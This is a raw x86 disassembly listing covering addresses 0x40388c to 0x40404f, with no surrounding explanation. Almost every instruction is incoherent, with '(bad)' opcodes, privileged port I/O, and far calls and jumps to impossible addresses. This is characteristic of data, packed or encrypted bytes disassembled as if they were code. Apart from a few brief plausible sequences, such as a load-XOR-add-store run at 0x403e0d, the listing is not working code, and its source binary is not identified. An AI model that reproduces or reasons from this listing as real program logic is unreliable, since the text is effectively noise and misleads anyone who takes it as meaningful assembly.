  40388c:	lds    edi,FWORD PTR [edi+0x47]
  40388f:	sub    DWORD PTR [ecx-0x3],ecx
  403892:	jne    0x40385d
  403894:	in     al,dx
  403895:	pop    ds
  403896:	test   DWORD PTR [edx+0x6be57a47],ebp
  40389c:	push   edi
  40389d:	mov    edx,0xa421e1f9
  4038a2:	mov    dh,0x7d
  4038a4:	mov    fs,WORD PTR [edi]
  4038a6:	addr16 pop ds
  4038a8:	dec    esp
  4038a9:	adc    DWORD PTR [ecx+ebx*4-0x33cb6e13],esp
  4038b0:	imul   eax,ebx,0xffffffbf
  4038b3:	dec    eax
  4038b4:	adc    ah,cl
  4038b6:	cmc    
  4038b7:	jbe    0x4038a1
  4038b9:	es fs mov ecx,eax
  4038bd:	or     bh,0xc8
  4038c0:	mov    al,BYTE PTR [eax+ecx*1]
  4038c3:	jmp    0x403b62
  4038c8:	into   
  4038c9:	rol    esi,cl
  4038cb:	ror    ecx,0xd9
  4038ce:	(bad)  
  4038d0:	mov    ebp,0x1dd405f3
  4038d5:	rcr    BYTE PTR [esi],cl
  4038d7:	and    edx,DWORD PTR [ebx*1+0x7efe7878]
  4038de:	js     0x403958
  4038e0:	mov    ecx,0xbbb51880
  4038e5:	lock dec eax
  4038e7:	push   ss
  4038e8:	(bad)  
  4038e9:	sbb    DWORD PTR fs:[ebx],ebp
  4038ec:	es cmp eax,0xc8fdc304
  4038f2:	sub    DWORD PTR [ebp-0x20],ecx
  4038f5:	sti    
  4038f6:	push   es
  4038f7:	fisttp DWORD PTR [edi+0x45]
  4038fa:	push   edx
  4038fb:	ins    DWORD PTR es:[edi],dx
  4038fc:	push   edx
  4038fd:	lahf   
  4038fe:	or     BYTE PTR [edi+0xbe70d13],dl
  403904:	sbb    DWORD PTR [edx-0x5d],ebp
  403907:	or     bl,bh
  403909:	pop    ebp
  40390a:	inc    ebp
  40390b:	mov    ebx,0x7cba59af
  403910:	sub    al,dh
  403912:	int    0x69
  403914:	inc    ebp
  403915:	test   BYTE PTR [ebp+0x1ce68166],ah
  40391b:	test   eax,0x2ba4a6e2
  403920:	(bad)  
  403921:	shl    BYTE PTR [edx],1
  403923:	xchg   esp,eax
  403924:	aas    
  403925:	retf   0x789c
  403928:	shr    DWORD PTR [edx+eax*2],cl
  40392b:	fbstp  TBYTE PTR ds:0x5a760892
  403931:	lea    ebx,[esi+0x7e]
  403934:	and    DWORD PTR [ebp-0x500931a7],ebx
  40393a:	std    
  40393b:	test   al,0x40
  40393d:	jecxz  0x4039be
  40393f:	repz xchg esp,eax
  403941:	cdq    
  403942:	mov    edx,0x5a6f457e
  403947:	mov    ebp,0xb39996a5
  40394c:	push   0xf2e5ba16
  403951:	push   ecx
  403952:	fimul  DWORD PTR [esi]
  403954:	enter  0x8282,0x28
  403958:	jmp    0xbe18a4ea
  40395d:	push   esp
  40395e:	loope  0x4039c6
  403960:	mov    ah,0x88
  403962:	mov    eax,0xd3e5ef12
  403967:	pop    bp
  403969:	les    esi,FWORD PTR [esi]
  40396b:	in     al,dx
  40396c:	sbb    al,BYTE PTR [eax+0x10ea22d5]
  403972:	cwde   
  403973:	mov    ds:0xf7c6ba49,al
  403978:	call   0x8bc3:0xeb014ed
  40397f:	in     al,dx
  403980:	sbb    DWORD PTR [esi-0x44c6b2ea],edx
  403986:	xchg   BYTE PTR ds:0xb5195e6e,ah
  40398c:	or     BYTE PTR [esi+0x17f57ed1],ah
  403992:	mov    dl,0x5b
  403994:	sub    ebp,DWORD PTR [edi+0x652d5a93]
  40399a:	add    al,al
  40399c:	mov    eax,ds:0x6d8a69a2
  4039a1:	loop   0x403a06
  4039a3:	dec    eax
  4039a4:	sbb    BYTE PTR [edi-0x7f],bh
  4039a7:	push   edx
  4039a8:	lock ss xor eax,0x3d24b5bb
  4039af:	jne    0x403a10
  4039b1:	int    0x5b
  4039b3:	iret   
  4039b4:	fild   WORD PTR [edi]
  4039b6:	data16 mov ah,0xe
  4039b9:	popf   
  4039ba:	cs xchg ecx,eax
  4039bc:	cmp    DWORD PTR [ecx],edi
  4039be:	mov    eax,0x6f1f78a6
  4039c3:	dec    ebp
  4039c4:	fld    QWORD PTR [ebp+0x388da179]
  4039ca:	dec    ebx
  4039cb:	popa   
  4039cc:	(bad)  
  4039cd:	scas   al,BYTE PTR es:[edi]
  4039ce:	add    DWORD PTR [edx],edx
  4039d0:	mov    edx,0x4e9def6f
  4039d5:	push   es
  4039d6:	scas   al,BYTE PTR es:[edi]
  4039d7:	pushf  
  4039d8:	push   0xc02d8de
  4039dd:	jne    0x403a3c
  4039df:	inc    edi
  4039e0:	cwde   
  4039e1:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039e3:	or     esi,esi
  4039e5:	mov    al,ds:0xf60233a9
  4039ea:	mov    dl,0xef
  4039ec:	gs xchg edx,eax
  4039ee:	sub    eax,ecx
  4039f0:	add    BYTE PTR [edi+0x12df93fe],ah
  4039f6:	les    esi,FWORD PTR [ebx-0x57]
  4039f9:	jecxz  0x4039b6
  4039fb:	and    DWORD PTR [esi+ebx*1+0x7e],ecx
  4039ff:	push   es
  403a00:	or     esi,esi
  403a02:	enter  0x399f,0x91
  403a06:	leave  
  403a07:	inc    ebx
  403a08:	js     0x4039b6
  403a0a:	pop    ebp
  403a0b:	int3   
  403a0c:	cmp    edi,DWORD PTR ds:0xbe25a21
  403a12:	fisub  WORD PTR [eax-0x53]
  403a15:	or     eax,0x9f3cce88
  403a1a:	lods   eax,DWORD PTR ds:[esi]
  403a1b:	xchg   BYTE PTR fs:[esi+0x18a7ea3d],al
  403a22:	mov    ds:0xcc99047d,eax
  403a27:	mov    bh,0xb6
  403a29:	inc    ebx
  403a2a:	cmc    
  403a2b:	dec    ebp
  403a2c:	or     al,0xff
  403a2e:	ret    0x6c46
  403a31:	jo     0x4039fb
  403a33:	mov    ecx,0xfe78c0b8
  403a38:	mov    bl,0xc1
  403a3a:	shl    ecx,1
  403a3c:	pop    edx
  403a3d:	cmp    bl,0x3a
  403a40:	fnsave [edi+0x52]
  403a43:	sub    BYTE PTR [ebx+0x44],dh
  403a46:	cli    
  403a47:	arpl   sp,cx
  403a49:	fld    DWORD PTR [eax+0x61]
  403a4c:	push   cs
  403a4d:	add    al,cl
  403a4f:	pop    edx
  403a50:	enter  0x85ce,0xeb
  403a54:	mov    ecx,0xf55a1639
  403a59:	mov    ebx,0x47bc3a41
  403a5e:	pop    edx
  403a5f:	fsubr  QWORD PTR [ebp-0x629568c3]
  403a65:	stos   DWORD PTR es:[edi],eax
  403a66:	dec    edx
  403a67:	xchg   esi,eax
  403a68:	daa    
  403a69:	cmp    al,0x2e
  403a6b:	dec    esp
  403a6c:	repz sub eax,0x2ba2e2ba
  403a72:	repz push es
  403a74:	jne    0x403af1
  403a76:	(bad)  
  403a77:	out    0x48,eax
  403a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a7a:	mov    cl,0xeb
  403a7c:	daa    
  403a7d:	gs or  eax,0x9de374f8
  403a83:	or     BYTE PTR [edx-0x6efa8abb],0x56
  403a8a:	call   0x8c0c:0x62d04d7a
  403a91:	pop    ebx
  403a92:	push   ecx
  403a93:	popa   
  403a94:	mov    al,ss:0xd288cb59
  403a9a:	mov    al,ds:0xa18ccb37
  403a9f:	iret   
  403aa0:	stos   BYTE PTR es:[edi],al
  403aa1:	das    
  403aa2:	add    bh,BYTE PTR [bx+si]
  403aa5:	sub    edi,edi
  403aa7:	sbb    al,0x36
  403aa9:	sar    DWORD PTR [eax-0x5e],0x78
  403aad:	xor    eax,DWORD PTR [eax]
  403aaf:	dec    edx
  403ab0:	inc    ebx
  403ab1:	xor    eax,DWORD PTR [esi+0x335d66df]
  403ab7:	clc    
  403ab8:	sub    bl,BYTE PTR [ecx-0x7e46ded4]
  403abe:	aam    0xec
  403ac0:	jns    0x403a9e
  403ac2:	aaa    
  403ac3:	fdiv   QWORD PTR [edx+0x55]
  403ac6:	icebp  
  403ac7:	mov    edx,DWORD PTR [eax-0x9a7424d]
  403acd:	inc    eax
  403ace:	or     edi,DWORD PTR [esi+0x47]
  403ad1:	adc    cl,BYTE PTR [ebx]
  403ad3:	fld    st(1)
  403ad5:	outs   dx,DWORD PTR ds:[esi]
  403ad6:	mov    esp,0xd5db1561
  403adb:	push   ds
  403adc:	cmp    DWORD PTR [ebp-0x1c],esi
  403adf:	stc    
  403ae0:	addr16 push ebx
  403ae2:	cmp    ch,bh
  403ae4:	cwde   
  403ae5:	out    dx,al
  403ae6:	or     esi,DWORD PTR [edx]
  403ae8:	test   eax,0xc1a9075a
  403aed:	lea    edi,[ebp+0xf]
  403af0:	mov    ch,0x87
  403af2:	xor    al,0x8
  403af4:	dec    ecx
  403af5:	add    edi,ebp
  403af7:	jl     0x403b0c
  403af9:	pop    edi
  403afa:	jno    0x403aad
  403afc:	push   eax
  403afd:	fimul  WORD PTR [esi]
  403aff:	xchg   ecx,eax
  403b00:	fdivr  DWORD PTR [eax-0x58a53156]
  403b06:	js     0x403b1d
  403b08:	not    ecx
  403b0a:	fsubr  QWORD PTR [ebx+0x5cf82364]
  403b10:	xor    BYTE PTR [edx+0x5c412446],0x8b
  403b17:	jne    0x403b5b
  403b19:	and    BYTE PTR [esp+edi*4+0x23612024],ch
  403b20:	stos   DWORD PTR es:[edi],eax
  403b21:	push   esi
  403b22:	pop    eax
  403b23:	(bad)  
  403b25:	pop    es
  403b26:	fs cli 
  403b28:	or     eax,0xf757faa6
  403b2d:	jns    0x403b1b
  403b2f:	push   cs
  403b30:	pop    ss
  403b31:	pop    es
  403b32:	mov    dl,0x38
  403b34:	push   ds
  403b35:	push   ss
  403b36:	dec    ebx
  403b37:	sbb    bl,BYTE PTR es:[ecx]
  403b3a:	stos   DWORD PTR es:[edi],eax
  403b3b:	dec    ecx
  403b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3d:	pop    edi
  403b3e:	pop    esi
  403b3f:	lods   eax,DWORD PTR ds:[esi]
  403b40:	pushf  
  403b41:	push   cs
  403b42:	ja     0x403b4a
  403b44:	sbb    al,0xb5
  403b46:	mov    eax,0xa18b3df6
  403b4b:	(bad)  
  403b4c:	adc    al,0xd
  403b4e:	pop    esp
  403b4f:	aas    
  403b50:	daa    
  403b51:	inc    esp
  403b52:	loope  0x403bb3
  403b54:	adc    al,0x48
  403b56:	and    esi,edx
  403b58:	scas   eax,DWORD PTR es:[edi]
  403b59:	mov    dl,0xd4
  403b5b:	rcr    DWORD PTR [eax+0x16],1
  403b5e:	clc    
  403b5f:	jge    0x403b88
  403b61:	(bad)  
  403b63:	cmp    esi,DWORD PTR [ebx+eax*2]
  403b66:	cmp    al,0xc5
  403b68:	je     0x4040bd
  403b6e:	jmp    0x403e0d
  403b73:	leave  
  403b74:	rol    dl,cl
  403b76:	rcr    ecx,cl
  403b78:	rcr    ecx,cl
  403b7a:	(bad)  
  403b7c:	ss push edx
  403b7e:	fwait
  403b7f:	ja     0x403bce
  403b81:	outs   dx,BYTE PTR ds:[esi]
  403b82:	test   eax,0x7878239a
  403b87:	(bad)  
  403b88:	jle    0x403c02
  403b8a:	js     0x403b2c
  403b8c:	out    0x49,eax
  403b8e:	mov    edi,0x42945a8
  403b93:	adc    DWORD PTR ss:[ebx+edx*2+0x3395a723],ebx
  403b9b:	popf   
  403b9c:	sub    al,ch
  403b9e:	pop    ds
  403b9f:	pop    ecx
  403ba0:	dec    esp
  403ba1:	int3   
  403ba2:	cld    
  403ba3:	dec    ebx
  403ba4:	cmp    eax,0x5e06819f
  403ba9:	push   ecx
  403baa:	sub    al,0x2
  403bac:	jge    0x403b5d
  403bae:	mov    al,BYTE PTR ds:0x234ccde3
  403bb4:	cmp    edx,ebp
  403bb6:	xchg   edi,eax
  403bb7:	sbb    DWORD PTR [esi+0x49],edi
  403bba:	add    DWORD PTR [ebp+0x52],edi
  403bbd:	mov    dl,0x20
  403bbf:	push   0xffffffd6
  403bc1:	fldcw  WORD PTR ds:0x45fe232e
  403bc7:	jp     0x403bae
  403bc9:	popf   
  403bca:	mov    edx,DWORD PTR [ecx+0x709fb5]
  403bd0:	fst    QWORD PTR [ebx+eiz*8-0x5f]
  403bd4:	test   eax,0x50ec6da2
  403bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bda:	pop    ecx
  403bdb:	stc    
  403bdc:	xchg   ecx,eax
  403bdd:	sbb    ah,BYTE PTR [esp+ebx*8-0x6ca5f338]
  403be4:	jae    0x403be5
  403be6:	xchg   ecx,eax
  403be7:	mov    bl,dh
  403be9:	and    al,0xfd
  403beb:	pop    edx
  403bec:	nop
  403bed:	aam    0xf6
  403bef:	das    
  403bf0:	pop    eax
  403bf1:	rcl    BYTE PTR [esi],0xdd
  403bf4:	pop    ebp
  403bf5:	fwait
  403bf6:	imul   edx,DWORD PTR [ebx+0x64],0x6c7faac
  403bfd:	test   ebp,edi
  403bff:	test   bl,dh
  403c01:	addr16 mov ah,0x22
  403c04:	call   ecx
  403c06:	mov    ebx,0x2adf9fef
  403c0b:	lods   al,BYTE PTR ds:[esi]
  403c0c:	ret    
  403c0d:	cli    
  403c0e:	adc    eax,0xfaa0fc02
  403c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c14:	icebp  
  403c15:	imul   eax,DWORD PTR [edi-0x56cff474],0x28a65c7f
  403c1f:	ret    0x1e79
  403c22:	aas    
  403c23:	push   esp
  403c24:	pop    eax
  403c25:	pop    ebp
  403c26:	jnp    0x403c93
  403c28:	mov    cl,0x46
  403c2a:	(bad)  [eax]
  403c2c:	sbb    DWORD PTR [ecx-0x55f508de],ebp
  403c32:	aad    0xd4
  403c34:	mov    cl,BYTE PTR [edi+0x17]
  403c37:	jb     0x403c89
  403c39:	(bad)  
  403c3b:	add    eax,0x23e92d33
  403c40:	inc    ebx
  403c41:	adc    dh,BYTE PTR [ebx]
  403c43:	inc    esp
  403c44:	xor    al,0xb5
  403c46:	pop    eax
  403c47:	push   esp
  403c48:	popa   
  403c49:	daa    
  403c4a:	add    eax,DWORD PTR [ebp+0x6479a653]
  403c50:	lods   eax,DWORD PTR ds:[esi]
  403c51:	arpl   WORD PTR [eax-0x61],cx
  403c54:	adc    BYTE PTR [esi+0xab65f0b],0xa3
  403c5b:	dec    ebp
  403c5c:	xchg   ebx,eax
  403c5d:	adc    ah,BYTE PTR [ebp-0x60]
  403c60:	cmp    BYTE PTR [esi+0x34],ah
  403c63:	adc    eax,0x8792c01f
  403c68:	lahf   
  403c69:	and    BYTE PTR [edx],ch
  403c6b:	call   0xcbfdaa11
  403c70:	mov    eax,0x32fbe9fa
  403c75:	cmp    BYTE PTR [esi+eiz*4+0x40bf24b9],bl
  403c7c:	mul    BYTE PTR [ecx]
  403c7e:	(bad)  
  403c7f:	and    cl,BYTE PTR [edi]
  403c81:	lods   al,BYTE PTR ds:[esi]
  403c82:	shl    BYTE PTR [edx-0x7ac22988],1
  403c88:	push   edi
  403c89:	push   ecx
  403c8a:	pop    edi
  403c8b:	nop
  403c8c:	fisubr DWORD PTR [edi]
  403c8e:	ror    dl,1
  403c90:	or     DWORD PTR [eax+0x58370944],esp
  403c96:	mov    ecx,edx
  403c98:	ret    0xcc
  403c9b:	scas   al,BYTE PTR es:[edi]
  403c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c9d:	adc    DWORD PTR [edx+eax*1+0x7ecf8e06],esi
  403ca4:	shl    ah,0x2f
  403ca7:	ret    
  403ca8:	pop    edx
  403ca9:	add    esp,DWORD PTR [ebx]
  403cab:	je     0x403cb0
  403cad:	jl     0x403c67
  403caf:	dec    edi
  403cb0:	xchg   BYTE PTR [esi-0x12],ch
  403cb3:	sub    edi,DWORD PTR [ebx-0x3ba6510f]
  403cb9:	rcl    DWORD PTR [edi+esi*1+0x11],1
  403cbd:	int    0x5c
  403cbf:	in     eax,0x63
  403cc1:	push   esi
  403cc2:	mov    bh,0x3c
  403cc4:	jne    0x403d01
  403cc6:	popa   
  403cc7:	mov    bl,0x66
  403cc9:	push   ebx
  403cca:	cmp    BYTE PTR [ebp+0x41b67c4b],cl
  403cd0:	pop    ecx
  403cd1:	aas    
  403cd2:	fild   QWORD PTR [ecx-0x537e35ab]
  403cd8:	cmp    eax,0xf82187f0
  403cdd:	test   eax,0x1dd8b40a
  403ce2:	xchg   DWORD PTR [eax-0x7d8985ca],ecx
  403ce8:	ret    
  403ce9:	data16 das 
  403ceb:	inc    ebp
  403cec:	out    0x7a,al
  403cee:	not    BYTE PTR [eax+0x38]
  403cf1:	dec    eax
  403cf2:	mov    WORD PTR [esi+0x5a33fafa],ss
  403cf8:	jl     0x403d50
  403cfa:	les    ecx,FWORD PTR [esi-0x32]
  403cfd:	inc    ebx
  403cfe:	push   eax
  403cff:	jb     0x403cb0
  403d01:	add    eax,0xb129e876
  403d06:	pop    ds
  403d07:	cmp    edi,DWORD PTR [eax-0x69]
  403d0a:	ja     0x403cab
  403d0c:	and    cl,cl
  403d0e:	and    al,0x14
  403d10:	dec    eax
  403d11:	stc    
  403d12:	jp     0x403cfe
  403d14:	not    DWORD PTR [ecx]
  403d16:	dec    eax
  403d17:	int3   
  403d18:	dec    ebx
  403d19:	pop    eax
  403d1a:	rcl    BYTE PTR [ebx],1
  403d1c:	mov    esi,0x8be64ce2
  403d21:	sub    BYTE PTR [esp+esi*1],al
  403d24:	sahf   
  403d25:	rcr    DWORD PTR [ebx-0x191361f7],1
  403d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d2c:	in     al,0x49
  403d2e:	fbld   TBYTE PTR [edx-0x12f46cdc]
  403d34:	ja     0x403d67
  403d36:	in     eax,dx
  403d37:	sub    eax,0x4a5ab75
  403d3c:	(bad)  [ecx]
  403d3e:	fisub  WORD PTR [esi-0x2ede6290]
  403d44:	nop
  403d45:	mov    esp,0x2ae945dd
  403d4a:	and    DWORD PTR [ebx],edx
  403d4c:	out    dx,eax
  403d4d:	test   BYTE PTR [ebx-0x5b83f04],dh
  403d53:	push   0xa8fa1c43
  403d58:	cmp    ebx,DWORD PTR [edi+edx*2-0x45]
  403d5c:	mov    ebx,0x1f89617a
  403d61:	das    
  403d62:	scas   eax,DWORD PTR es:[edi]
  403d63:	push   edi
  403d64:	mov    al,ds:0xd14dd1e4
  403d69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d6a:	add    bh,dl
  403d6c:	jo     0x403cf8
  403d6e:	cmp    ah,ah
  403d70:	loop   0x403d30
  403d72:	out    0xeb,al
  403d74:	xor    BYTE PTR [edi+0x55],0x42
  403d78:	data16 xor dh,ch
  403d7b:	in     eax,0xda
  403d7d:	push   ss
  403d7e:	jle    0x403d5c
  403d80:	outs   dx,BYTE PTR ds:[esi]
  403d81:	cmp    DWORD PTR [ecx],esp
  403d83:	mov    bl,0x63
  403d85:	dec    edi
  403d86:	and    cl,BYTE PTR [ecx+edx*1-0xd995ffb]
  403d8d:	cli    
  403d8e:	rcr    DWORD PTR [edi+edx*1-0x3041286d],1
  403d95:	cld    
  403d96:	fnstcw WORD PTR [ecx+0x6e]
  403d99:	mov    al,0x94
  403d9b:	or     bh,dl
  403d9d:	into   
  403d9e:	enter  0xfeab,0xf2
  403da2:	push   es
  403da3:	in     eax,0x43
  403da5:	add    ebp,DWORD PTR [edx]
  403da7:	cmp    eax,0x86c4a7e
  403dac:	xchg   ebx,eax
  403dad:	hlt    
  403dae:	or     eax,0xa27149bf
  403db3:	add    DWORD PTR [ebp-0x7c],0x59d75f4f
  403dba:	adc    eax,DWORD PTR [ebx]
  403dbc:	and    BYTE PTR [ecx+0x7aa73e4b],ch
  403dc2:	fild   DWORD PTR [ebx+0x6f]
  403dc5:	inc    edx
  403dc6:	sub    bl,dl
  403dc8:	test   eax,0x26ec28d5
  403dcd:	pusha  
  403dce:	inc    ebp
  403dcf:	sub    eax,0x6160338
  403dd4:	jns    0x403dfc
  403dd6:	pushf  
  403dd7:	rcl    BYTE PTR [esi],cl
  403dd9:	iret   
  403dda:	ins    WORD PTR es:[edi],dx
  403ddc:	lds    esi,FWORD PTR [edx+esi*8+0x3ffc84a6]
  403de3:	loop   0x403d8b
  403de5:	addr16 add eax,0x9f8f20a
  403deb:	ins    DWORD PTR es:[edi],dx
  403dec:	in     eax,0xa3
  403dee:	mov    ebx,0xe6ca13e4
  403df3:	out    0xf2,al
  403df5:	jecxz  0x403de0
  403df7:	sbb    cl,dh
  403df9:	das    
  403dfa:	adc    eax,0x3af1f6c2
  403dff:	cmp    BYTE PTR [eax-0x3f],dh
  403e02:	xchg   DWORD PTR [esi],edi
  403e04:	adc    BYTE PTR [edi],0x1e
  403e07:	dec    DWORD PTR [esi]
  403e09:	fxch   st(2)
  403e0b:	aam    0xf6
  403e0d:	mov    eax,DWORD PTR [ebp+0x8]
  403e10:	mov    ecx,DWORD PTR [ebp-0x8]
  403e13:	xor    eax,esi
  403e15:	add    eax,edi
  403e17:	mov    DWORD PTR [ecx],eax
  403e19:	jmp    0x404380
  403e1e:	jmp    0x4040bd
  403e23:	ds retf 0xcdca
  403e27:	retf   0xd9cd
  403e2a:	fldenv ds:0xfbdd8593
  403e30:	mov    cl,0x2c
  403e32:	add    ebx,DWORD PTR [eax]
  403e34:	and    BYTE PTR [eax+0x78],bh
  403e37:	(bad)  
  403e38:	jle    0x403eb2
  403e3a:	js     0x403e15
  403e3c:	mov    eax,0x2ab1308f
  403e41:	mov    ebx,0xff5700e8
  403e46:	and    eax,ecx
  403e48:	ror    DWORD PTR [edi],cl
  403e4a:	imul   ebx,eax,0x7b
  403e4d:	pop    ebp
  403e4e:	mov    al,ds:0xc02a5a81
  403e53:	jmp    0x403e0d
  403e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e56:	add    edx,DWORD PTR [esp+edx*1+0x6f]
  403e5a:	xchg   ebx,eax
  403e5b:	jb     0x403e13
  403e5d:	xchg   ebp,eax
  403e5e:	arpl   WORD PTR [edi+0x62496b3b],cx
  403e64:	xlat   BYTE PTR ds:[ebx]
  403e65:	dec    edx
  403e66:	cld    
  403e67:	ja     0x403df4
  403e69:	dec    ebx
  403e6a:	push   edx
  403e6b:	mov    edx,0x2cdd56b
  403e70:	pop    es
  403e71:	inc    edi
  403e72:	stc    
  403e73:	popa   
  403e74:	aaa    
  403e75:	shl    BYTE PTR [esi+0x5f],cl
  403e78:	and    BYTE PTR [eax+0x12],bh
  403e7b:	mov    ebx,0x51534b37
  403e80:	int    0xf7
  403e82:	mov    WORD PTR [esi+0x1010c593],es
  403e88:	push   edx
  403e89:	retf   0x9f4d
  403e8c:	hlt    
  403e8d:	fsubr  QWORD PTR [ebx+0xd]
  403e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e91:	int3   
  403e92:	adc    eax,0x965f5274
  403e97:	and    cl,ah
  403e99:	adc    al,0xc4
  403e9b:	cmp    eax,0x9c2284b6
  403ea0:	scas   eax,DWORD PTR es:[di]
  403ea2:	push   esp
  403ea3:	sbb    BYTE PTR [eax-0x2ceabb72],ch
  403ea9:	mov    ds:0xa44acc25,al
  403eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403eaf:	jo     0x403ef4
  403eb1:	pop    ebp
  403eb2:	inc    ecx
  403eb3:	in     al,dx
  403eb4:	add    eax,0xec81e4b9
  403eb9:	jne    0x403e71
  403ebb:	(bad)  
  403ebc:	int3   
  403ebd:	inc    edx
  403ebe:	xchg   edx,eax
  403ebf:	add    al,0xce
  403ec1:	in     al,dx
  403ec2:	call   0xba4e:0x76d2ce05
  403ec9:	xor    eax,0xc097a084
  403ece:	jmp    0x403e64
  403ed0:	mov    cl,0x1d
  403ed2:	push   ebp
  403ed3:	jb     0x403ed1
  403ed5:	sub    DWORD PTR [ebx+0x55abb28b],edx
  403edb:	dec    esi
  403edc:	sub    esp,DWORD PTR ds:0x63bc6ade
  403ee2:	sbb    al,0xe2
  403ee4:	cwde   
  403ee5:	dec    edi
  403ee6:	cs js  0x403eb3
  403ee9:	rol    DWORD PTR [edx],cl
  403eeb:	mov    al,cl
  403eed:	or     BYTE PTR [edi+0x21],al
  403ef0:	stos   BYTE PTR es:[edi],al
  403ef1:	arpl   cx,ax
  403ef3:	xchg   edi,eax
  403ef4:	push   edi
  403ef5:	test   al,0x8b
  403ef7:	(bad)  
  403ef9:	aam    0xe6
  403efb:	or     BYTE PTR [eax+0x7e],ch
  403efe:	jge    0x403e93
  403f00:	in     eax,dx
  403f01:	sub    esi,DWORD PTR [ecx+0x14]
  403f04:	js     0x403f51
  403f06:	nop
  403f07:	or     edx,DWORD PTR [edi-0xb1ae6d]
  403f0d:	push   ds
  403f0e:	scas   al,BYTE PTR es:[edi]
  403f0f:	inc    ebx
  403f10:	jae    0x403f03
  403f12:	adc    dl,BYTE PTR [edx+0x78]
  403f15:	push   ebx
  403f16:	add    ecx,DWORD PTR [ebx-0x7b]
  403f19:	sbb    dh,cl
  403f1b:	push   eax
  403f1c:	ss pop es
  403f1e:	mov    bl,dh
  403f20:	pop    ds
  403f21:	outs   dx,BYTE PTR ds:[esi]
  403f22:	mov    ecx,0x65737d42
  403f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f28:	xchg   edi,eax
  403f29:	mov    bl,0xda
  403f2b:	test   cl,cl
  403f2d:	test   DWORD PTR [esi-0x5c],edi
  403f30:	out    0xa0,eax
  403f32:	mov    edi,0x8a39e4d8
  403f37:	xor    edi,DWORD PTR [ecx+0xe]
  403f3a:	pop    ebp
  403f3b:	jmp    0x403f97
  403f3d:	inc    eax
  403f3e:	inc    DWORD PTR [ebp*4+0x5bca0b9c]
  403f45:	stc    
  403f46:	or     cl,BYTE PTR [edi]
  403f48:	inc    ebp
  403f49:	xor    eax,0xfa9620d4
  403f4e:	adc    eax,0xd5bcdda3
  403f53:	xacquire xchg BYTE PTR [edx+0x6976d6b0],ch
  403f5a:	fnstenv [esi-0x43]
  403f5d:	repz sub al,0x41
  403f60:	push   0xffffffbe
  403f62:	cmp    dl,bl
  403f64:	adc    al,0x25
  403f66:	scas   eax,DWORD PTR es:[edi]
  403f67:	retf   
  403f68:	in     eax,dx
  403f69:	fisub  DWORD PTR [ecx-0x1d]
  403f6c:	inc    ecx
  403f6d:	jmp    0x59f70390
  403f72:	jb     0x403f23
  403f74:	jns    0x403eff
  403f76:	add    bh,BYTE PTR [edi+0x47]
  403f79:	xor    eax,0x13a2944d
  403f7e:	mov    edx,DWORD PTR [edx]
  403f80:	rol    eax,cl
  403f82:	jbe    0x403fb8
  403f84:	leave  
  403f85:	jg     0x19e515db
  403f8b:	les    edi,FWORD PTR [esi-0x57]
  403f8e:	scas   eax,DWORD PTR es:[edi]
  403f8f:	mov    fs,edx
  403f91:	mov    esi,0x9c1561c8
  403f96:	jnp    0x403f4e
  403f98:	pushf  
  403f99:	gs xchg ebp,eax
  403f9b:	push   cs
  403f9c:	xor    DWORD PTR [ebx-0x3c8b0823],ecx
  403fa2:	mov    edi,0xb819a34d
  403fa7:	sbb    BYTE PTR [ebx-0xabfb871],dl
  403fad:	shl    DWORD PTR [edi],1
  403faf:	jno    0x403fcc
  403fb1:	jns    0x403f71
  403fb3:	or     ebx,ecx
  403fb5:	out    0x1,al
  403fb7:	lsl    ecx,WORD PTR [ecx-0x56]
  403fbb:	mov    ecx,0x9fb08f3f
  403fc0:	ins    BYTE PTR es:[edi],dx
  403fc1:	rol    esp,0x5e
  403fc4:	dec    ebx
  403fc5:	popf   
  403fc6:	mov    bh,0x5c
  403fc8:	fcomp  QWORD PTR [ebp+eiz*8+0x51]
  403fcc:	mov    ah,BYTE PTR [edi]
  403fce:	jl     0x404020
  403fd0:	adc    dl,BYTE PTR [esi+0x5f]
  403fd3:	mov    ds:0xfa0431bd,eax
  403fd8:	test   BYTE PTR [edx-0x2501f1d5],cl
  403fde:	mov    eax,0xb224aac
  403fe3:	mov    dl,0x11
  403fe5:	aam    0xc3
  403fe7:	push   ds
  403fe8:	iret   
  403fe9:	leave  
  403fea:	xor    BYTE PTR ds:0xcd2962e4,0x9
  403ff1:	jbe    0x404003
  403ff3:	lods   al,BYTE PTR ds:[esi]
  403ff4:	inc    esi
  403ff5:	jno    0x403fb1
  403ff7:	popa   
  403ff8:	adc    al,0x19
  403ffa:	and    BYTE PTR [eax-0x4f],al
  403ffd:	sub    BYTE PTR ds:0x28612faf,ah
  404003:	mov    dl,0xa5
  404005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404006:	repz jbe 0x404074
  404009:	sbb    BYTE PTR [edx+ecx*1-0x5ee309ca],cl
  404010:	xor    ch,BYTE PTR [ebx-0x55]
  404013:	push   edi
  404014:	clc    
  404015:	in     al,dx
  404016:	sub    dh,BYTE PTR [ecx+edx*8+0x148a85ad]
  40401d:	sbb    dl,BYTE PTR [eax]
  40401f:	int    0x90
  404021:	xchg   edi,eax
  404022:	push   ds
  404023:	fcmove st,st(2)
  404025:	mov    dl,0xe1
  404027:	push   0xffffff85
  404029:	test   BYTE PTR [ebx-0x29],ch
  40402c:	mov    WORD PTR [edx],fs
  40402e:	jb     0x403fdc
  404030:	or     esi,edi
  404032:	stos   DWORD PTR es:[edi],eax
  404033:	rol    BYTE PTR [ecx+0x14],1
  404036:	pop    esi
  404037:	sar    edx,0x59
  40403a:	jb     0x40403f
  40403c:	xchg   DWORD PTR [eax-0x3a],esi
  40403f:	call   0xcdee6677
  404044:	and    BYTE PTR [eax],ch
  404046:	xor    ah,BYTE PTR [eax-0x7a]
  404049:	cmc    
  40404a:	adc    dh,BYTE PTR [esi-0x11]
  40404d:	jp     0x40404b
  40404f:	pop    esi
